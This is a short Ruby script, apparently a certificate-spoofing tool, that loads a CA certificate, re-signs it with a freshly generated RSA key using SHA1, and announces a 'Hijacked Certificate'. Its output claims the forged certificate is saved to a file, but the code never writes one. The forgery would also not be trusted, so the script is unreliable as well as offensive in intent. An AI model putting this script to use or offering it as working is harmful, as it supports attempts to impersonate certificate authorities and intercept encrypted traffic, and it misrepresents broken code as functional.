require 'rubygems'
require 'openssl'
require 'digest/md5'

key = OpenSSL::PKey::RSA.new(2048)
puts "Spoof must be in PEM format and saved as ca.pem"
raw = File.read "ca.pem"
ca_cert = OpenSSL::X509::Certificate.new raw

puts "before we sign the cert: #{ca_cert.verify(key)}"
ca_cert.sign(key, OpenSSL::Digest::SHA1.new)
puts "after we sign the cert: #{ca_cert.verify(key)}"

puts "Hijacked Certificate with chainloaded key saved  @ #{ca_cert.serial}.pem"
printf "Verifying Keys Intergity: "
puts  ca_cert.verify(key)
